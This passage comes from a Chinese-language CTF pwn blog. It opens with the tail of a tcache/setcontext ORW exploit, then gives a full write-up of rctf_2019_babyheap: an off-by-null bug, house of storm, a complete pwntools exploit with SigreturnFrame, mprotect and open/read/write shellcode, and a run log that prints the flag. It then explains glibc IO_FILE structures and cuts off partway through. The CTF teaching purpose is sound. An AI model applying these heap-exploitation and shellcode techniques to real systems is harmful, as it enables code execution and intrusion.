class="number">0x0000000000130544</span>+libc.address</span><br><span class="line">pop_rax = libc.address + <span class="number">0x0000000000043ae8</span></span><br><span class="line"></span><br><span class="line">edit(p8(<span class="number">0x1</span>)*<span class="number">64</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap+<span class="number">0xef8</span>)+p64(free_hook)+p64(heap+<span class="number">0xe18</span>)+p64(heap+<span class="number">0xe80</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改tcache_pethread,可以任意写</span></span><br><span class="line">success(<span class="string">&quot;orw:&quot;</span>+<span class="built_in">hex</span>(heap+<span class="number">0xe18</span>))</span><br><span class="line">add(<span class="number">0x58</span>)<span class="comment"># 把freehook申请出来</span></span><br><span class="line">edit(p64(setcontext)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">flag_str_addr = heap+<span class="number">0xf30</span></span><br><span class="line">flag_addr = heap+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsp = heap+<span class="number">0xe18</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">0</span></span><br><span class="line">r12 = <span class="number">0</span></span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">stack_pivot = flat(rbx,rbp,r12,r13,r14,rsp+<span class="number">8</span>,pop_rdi,<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;stack_pivot len:&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(stack_pivot)))</span><br><span class="line">edit(stack_pivot+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">orw1 = flat(pop_rdi,flag_str_addr,pop_rsi,<span class="number">0</span>,pop_rax,<span class="number">2</span>,syscall,pop_rdi,<span class="number">3</span>,pop_rsi,flag_addr,pop_rdx_r10,<span class="number">0x100</span>,)</span><br><span class="line"></span><br><span class="line">edit(orw1+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">orw2 = flat(<span class="number">0</span>,pop_rax,<span class="number">0</span>,syscall,pop_rdi,<span class="number">1</span>,pop_rsi,flag_addr,pop_rdx_r10,<span class="number">0x100</span>,<span class="number">0</span>,pop_rax,<span class="number">1</span>,syscall)</span><br><span class="line">edit(orw2+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">1. allocate</span><br><span class="line">2. edit</span><br><span class="line">3. show</span><br><span class="line">4. delete</span><br><span class="line">5. exit</span><br><span class="line">Your choice: Index: flag&#123;test&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00`\x00\x00\x00\x00ò\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe2�\x17\x00\x00\x00\x00\x00\xe3�\x17\x00\x00\x00\x00\x00\x00\x00\x00\x001\x00\x00\x00\x00\xdc\xe9\xc7&lt;\x7f\x000\xe6�\x17\x00\x03\x00\x00\x00P\xe4�\x17\x00\x00\x00\x00\x00!\x00\x00\x00\x00\xe2�\x17\x00\x00\x00\x00\x00$  </span><br></pre></td></tr></table></figure><h3 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/rctf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>有沙盒只能orw,且程序<code>mallopt(1,0)</code>禁用了fastbin</p><p>edit存在一个off-by-null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * (<span class="type">int</span>)v1)</span><br><span class="line">          + (<span class="type">int</span>)read_n(*((<span class="type">void</span> **)ptrs + <span class="number">2</span> * (<span class="type">int</span>)v1), *((_DWORD *)ptrs + <span class="number">4</span> * (<span class="type">int</span>)v1 + <span class="number">2</span>))) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这题利用还用到了house of storm</p><p>此外程序分配内存使用的callloc,会将分配出来的内存置0</p><p><strong>利用思路:</strong></p><ol><li>先利用house of storm将free_hook-0x20作为一个chunk分配出来</li><li>往free_hook写上<code>setcontext +(free_hook+0x18)*2 + shellcode1</code>其中setcontext的内容为调用mprotect将free_hook所在页的权限修改,并修改rsp为free_hook后方并返回,shellcode1因为长度有限需要二次调用,故shellcode1为向free_hook所在段读入数据并jmp到此处</li><li>将setcontext结构所需数值保存到一个chunk中并free该chunk</li><li>发送真正的orw-shellcode2</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rctf_2019_babyheap&#x27;</span>)</span><br><span class="line">context.binary=<span class="string">&#x27;./rctf_2019_babyheap&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Choice: \n&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">malloc_hook= u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libc.address=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">set_context = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">add(<span class="number">0x160</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">5</span>)<span class="comment">#6&#x27;s prev_inuse be 0</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#size(0x510)-&gt;size(0x500),therefore set_inuse will set in a incorrect location,so 6&#x27;s prev_inuse will always be 0</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#so uaf</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">8</span>)     <span class="comment">#again</span></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4e8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">fake_chunk=free_hook-<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk))</span><br><span class="line">edit(<span class="number">12</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>) +p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">dbg()</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#up to now all do for house of storm</span></span><br><span class="line"></span><br><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,%d</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_addr</span><br><span class="line"><span class="comment">#read..</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">12</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(asm(shellcode2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果,每次运行只有一定概率成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ python 3.py</span><br><span class="line">[+] Starting local process &#x27;./rctf&#x27;: pid 27043</span><br><span class="line">[*] &#x27;/home/aichch/pwn/rctf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] libc_base:0x7fa0b43a0000</span><br><span class="line">0x7fa0b4766000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./rctf&#x27; stopped with exit code 0 (pid 27043)</span><br><span class="line">flag&#123;test&#125;[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure><h1 id="任务Ⅱ"><a href="#任务Ⅱ" class="headerlink" title="任务Ⅱ"></a>任务Ⅱ</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p>先看IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;  <span class="comment">//重要</span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被封装于_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><details class="folding-tag" blue><summary> 其中_IO_jump_t结构体的定义为 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    